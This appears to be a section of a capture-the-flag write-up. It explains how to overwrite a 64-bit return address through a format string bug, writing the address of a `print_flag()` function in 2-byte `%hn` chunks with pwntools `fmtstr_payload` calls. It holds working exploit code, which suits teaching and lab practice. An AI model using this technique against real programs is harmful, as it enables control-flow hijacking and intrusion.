### Writing the Address in Chunks (Why the `payload_chunk` logic matters)

We need to **overwrite the return address** with the address of `print_flag()`. But here's the catch:

* We're on a **64-bit system**, so addresses are 8 bytes (64 bits)
* Format string writes using `%hn` can only write **2 bytes at a time**
* Writing a full 8-byte address in one go is not feasible with format strings
* So, we have to **break the address into 2-byte chunks** and write them **little-endian style** (least significant bytes first)

#### Breakdown:

Let's say `print_flag()` is at:

```
0x555555554aaa
```

In memory (little-endian), this is stored as:

```
aa 4a 55 55 55 55 00 00
```

We’ll write the lower 6 bytes only (48 bits), split into three chunks:

```python
payload_chunk = [
    (print_flag_addr & 0xFFFF),              # lowest 2 bytes (aa4a → 0x4aaa)
    ((print_flag_addr >> 16) & 0xFFFF),      # middle 2 bytes (5555)
    ((print_flag_addr >> 32) & 0xFFFF)       # top 2 bytes (5555)
]
```

Each value is written using `fmtstr_payload`, which takes a dictionary:
`{address_to_write_to: value}`

We also need to write to 3 **separate addresses**, each 2 bytes apart:

* First write at the return address
* Second at return + 2
* Third at return + 4

```python
conn.sendline(fmtstr_payload(6, {return_addr_overwrite: payload_chunk[0]}))
conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 2: payload_chunk[1]}))
conn.sendline(fmtstr_payload(6, {return_addr_overwrite + 4: payload_chunk[2]}))
```

* The `6` is the **format string offset** — it tells pwntools which argument number the value starts at on the stack.
* Pwntools generates the correct format string to write **each 2-byte chunk** to the **right place**, one at a time.

#### Why 2-byte chunks?

Because using `%hn` (half-word write) is safer and easier than `%n` (4 or 8 bytes) when:

* PIE/ASLR makes addresses unpredictable
* You want to avoid corrupting unrelated memory
* You’re controlling exact memory locations like return pointers

---

### TL;DR Mental Model:

1. You can't write a full 64-bit address at once
2. You split the address into 2-byte pieces: low → mid → high
3. Each chunk is written to the stack using `%hn`, one after the other
4. Pwntools `fmtstr_payload()` helps generate those strings for you
5. You just tell it: *“Write this chunk to this address”* — it handles the format string math
